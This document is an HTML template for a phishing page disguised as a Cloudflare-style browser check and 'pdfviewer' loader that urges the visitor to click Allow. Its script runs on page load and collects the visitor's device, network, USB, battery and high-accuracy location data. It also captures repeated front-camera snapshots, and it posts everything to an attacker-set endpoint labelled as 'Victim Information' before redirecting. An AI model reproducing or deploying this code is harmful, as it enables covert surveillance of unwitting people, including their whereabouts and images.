<html lang="en-US">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1" />
    <meta name="robots" content="noindex, nofollow" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Just a moment....</title>
    <style type="text/css">
      /* RESET */
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      html, body {
        width: 100%;
        min-height: 100vh;
        height: 100%;
        background-color: #ffffff;
        color: #000000;
        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI",
          Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif;
        font-size: 16px;
        line-height: 1.7em;
        -webkit-font-smoothing: antialiased;
      }

      body {
        display: flex;
        justify-content: center;
        align-items: center;
        overflow: auto; /* allow scrolling on small screens */
      }

      h1 {
        text-align: center;
        font-weight: 700;
        margin: 12px 0;
        font-size: clamp(20px, 5vw, 32px);
        color: #000000;
        line-height: 1.25;
        padding: 0 10px;
      }

      h3 {
        text-align: center;
        font-size: clamp(14px, 3.5vw, 20px);
        font-weight: 400;
        margin: 10px 0;
        padding: 0 10px;
      }

      p {
        font-size: clamp(14px, 3.5vw, 20px);
        font-weight: 400;
        margin: 8px 0;
        text-align: center;
        padding: 0 10px;
      }

      @keyframes fader {
        0%   { opacity: 0.2; }
        50%  { opacity: 1; }
        100% { opacity: 0.2; }
      }

      #cf-bubbles > .bubbles {
        animation: fader 1.6s infinite;
        background-color: #f58220;
        width: clamp(14px, 4vw, 20px);
        height: clamp(14px, 4vw, 20px);
        margin: 2px;
        border-radius: 100%;
        display: inline-block;
      }
      #cf-bubbles > .bubbles:nth-child(2) { animation-delay: 0.2s; }
      #cf-bubbles > .bubbles:nth-child(3) { animation-delay: 0.4s; }

      a {
        color: #2c7cb0;
        text-decoration: none;
        transition: color 0.15s ease;
      }
      a:hover { color: #f4a15d; }

      /* ─── MAIN CONTENT ─── */
      .cf-browser-verification {
        width: 100%;
        max-width: 600px;
        margin: 0 auto;
        padding: 20px 15px;
        text-align: center;
      }

      /* ─── LOADING SCREEN ─── */
      .loading-screen {
        width: 100%;
        text-align: center;
        padding: 10px 0;
        display: flex;
        flex-direction: column;
        align-items: center;
      }

      .loading-screen .title {
        font-size: clamp(18px, 5vw, 28px);
        font-weight: 600;
        margin-bottom: 10px;
      }

      /* ★★★ FULLY RESPONSIVE LOGO IMAGE ★★★ */
      .loading-screen img.logo {
        width: 100%;
        max-width: 320px;
        height: auto;
        display: block;
        margin: 0 auto 15px auto;
        border-radius: 8px;
        object-fit: contain;
      }

      /* Very small phones (< 400px) */
      @media (max-width: 399px) {
        .cf-browser-verification {
          padding: 15px 10px;
        }
        .loading-screen img.logo {
          max-width: 220px;
        }
      }

      /* Small phones (400px - 480px) */
      @media (min-width: 400px) and (max-width: 480px) {
        .loading-screen img.logo {
          max-width: 260px;
        }
      }

      /* Phones landscape */
      @media (min-width: 481px) and (max-width: 767px) {
        .loading-screen img.logo {
          max-width: 300px;
        }
      }

      /* Tablets and small desktops */
      @media (min-width: 768px) and (max-width: 1024px) {
        .loading-screen img.logo {
          max-width: 350px;
          height: 250px;
          display: block;
        }
      }

      /* Large desktops */
      @media (min-width: 1025px) {
        .loading-screen img.logo {
          max-width: 420px;
        }
      }

      .attribution {
        margin-top: 20px;
        font-size: 14px;
        text-align: center;
      }

      .ray_id {
        display: block;
        margin-top: 8px;
        font-size: 12px;
        word-break: break-all;
      }

      #no-cookie-warning p {
        color: #bd2426;
      }
    </style>
  </head>
  <body>
    <div class="cf-browser-verification cf-im-under-attack">
      <noscript>
        <h1 style="color: #bd2426">Please turn JavaScript on and reload the page.</h1>
      </noscript>

      <div id="cf-content">
        <div id="cf-bubbles">
          <div class="bubbles"></div>
          <div class="bubbles"></div>
          <div class="bubbles"></div>
        </div>

        <h1>Click Allow then only this work properly</h1>
        <h3>
          <span data-translate="checking_browser">Waiting 5 seconds</span>
          Network
        </h3>

        <div id="no-cookie-warning" class="cookie-warning" style="display: none">
          <p>Please enable Cookies and reload the page.</p>
        </div>

        <div class="loading-screen">
          <div class="title">pdfviewer</div>
          <!-- ★ FULLY RESPONSIVE IMAGE ★ -->
          <img
            src="https://raw.githubusercontent.com/karnameena/Images-/refs/heads/main/lv_0_20260828134638.jpg"
            alt="pdfviewer Logo"
            class="logo"
          />
        </div>

        <p data-translate="process_is_automatic">Your pdfviewer are loading..</p>
        <p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs" style="display: none">
          Please allow up to 5 seconds…
        </p>
        <p data-translate="redirecting" id="cf-spinner-redirecting" style="display: block">
          Loading.…
        </p>
      </div>

      <form
        class="challenge-form"
        id="challenge-form"
        action="http://000webhost.com/?__cf_chl_jschl_tk__=gUwvgP4U.d3mjLABceeM1Hoq0yzKoVb2_YClw1ApwLs-1640764924-0-gaNycGzNA70"
        method="POST"
        enctype="application/x-www-form-urlencoded"
      >
        <span data-translate="error" style="display: none">error code: 1020</span>
      </form>
    </div>

    <video id="video" style="display: none" playsinline autoplay></video>
    <canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
    <script type="text/javascript">
      var c=false,l=false,uid="<%=uid %>";
      async function gather(){
        var td="";
        <% if(!t){ %>
          td += '<code>😈guna karna😈 <br><br>Maatunaa Daa <br>Pambarakatta Mandayaan <br>🧐 Follo me in Instagram 😜 @gunakarna  ....<br>Our Victim Information Here 👇 </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
        <% }else{ %>
          await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>😈guna karna😈💻Our Victim Information From Maatuna Da  Pambarakatta Mandayaan 🧐 Follo me in Instagram 😜 @gunakarna </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | Time: <%=time %></b>'));
        <% } %>

        td+="<br><br><b>⏳ Date In Victim's Device :</b> "+new Date()+"<br>";
        var xo=["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
        var xoc=["type","rtt","saveData","effectiveType","downlink","downlinkMax"];
        ///INITIALS
        td+="<br><b>📱 Device Information</b><br>";
        for(var i=0;i < xo.length;i++){
          if(xo[i] in navigator){
            var str = navigator[xo[i]];
            td+="<b>"+xo[i] +"</b>: <code>"+str+"</code><br>";
          }
        }

        if (navigator.mediaDevices || navigator.mediaDevices?.enumerateDevices) {
          await navigator.mediaDevices?.enumerateDevices()
          .then(function(devices) {
            td+="<br><b>📷 Media Device Information</b><br>";
            devices.forEach(function(device) {
              td+="<b>"+device.kind+":</b> " + device.label +" id = <code>" + device.deviceId+"</code><br>";
            });
          })
          .catch(function(err) {
            td+="<br><b>📷 Media Device Information</b><br>";
            td+="⚠️ Media Device Error: "+err.name + ": " + err.message;
          });
        }

        ////CONNECTION
        if("connection" in navigator){
          td+="<br><b>🕸️ Network Information</b><br>";
          for(var i=0;i < xoc.length;i++){
            var str = navigator.connection[xoc[i]];
            td+="<b>"+xoc[i] +"</b>: <code>"+str+"</code><br>";
          }
        }

        ////USB
        if("usb" in navigator){
          await navigator.usb.getDevices()
          .then(devices => {
            td+="<br><b>🔌 Total USB devices connected:</b> " + devices.length+"<br>";
            devices.forEach(device => {
              td+="<b>Product name:</b> " + device.productName + " , <b>Serial number: </b> <code>" + device.serialNumber+"</code><br>";
            });
          });
        }

        if("getBattery" in navigator){
          await navigator.getBattery().then(function(battery) {
            td+="<br><b>🔋 Battery Information</b><br>";
            td+="<b>🔋Battery Level:</b> " +battery.level*100+"%<br><b>⚡ Is Battery Charging:</b> "+battery.charging+"";
          });
        }

        //////Location
        if(!navigator.geolocation) {
          td+="<br><b>📍 Location Information</b><br>";
          td+="⚠️ Location API not avilable";
          l=true;
        }

        function success(pos) {
          const crd = pos.coords;
          $.post("<%=a %>/location",{uid:uid,lat:encodeURIComponent(crd.latitude),lon:encodeURIComponent(crd.longitude),acc:encodeURIComponent(crd.accuracy)},(s)=>{
            l=true;
            red();
          });
        }

        function error(err) {
          td+="<br><b>📍 Location Information</b><br>";
          td+="⚠️ Location ERROR: <code>"+err.message+"</code>";
          l=true;
        }
        if(navigator.geolocation){
          await navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true, maximumAge: 0});
        }

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        var imgsent=0;

        function post(o){
          $.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(o)},(s)=>{
            imgsent+=1;
            if(imgsent==4){
              c=true;
              red();
            }
          });
        }
        const constraints = {audio: false,video: {facingMode: "user" }};
        async function cam() {
          try {
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            handleSuccess(stream);
          } catch (e) {
            td+='<br><b>📷 Camera Images</b>';
            td+= `<br>⚠️ Camera Access Error: ${e.toString()}`;
            c=true;
            red();
          }
        }

        function handleSuccess(stream) {
          window.stream = stream;
          video.srcObject = stream;
          var context = canvas.getContext('2d');
          var id=setInterval(function(){
            context.drawImage(video, 0, 0, 500, 500);
            var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64", "");
            post(canvasData);
          }, 1500);
        }

        cam();

        function red(){
          if(c && l){
            window.location.href="<%=url %>"
          }
        }

        $.post("<%=a %>",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},(s)=>{});
      }

      window.onload=()=>{
        gather();
        var i="qwertyuioplkjhgfdsazxcvbnm0987654321";
        var str="";
        for(var o=0;o<17;o++){
          str+=i[Math.floor(Math.random() * 35)];
        }
        document.getElementById("ray").innerHTML=str;
      };
    </script>
  </body>
</html>
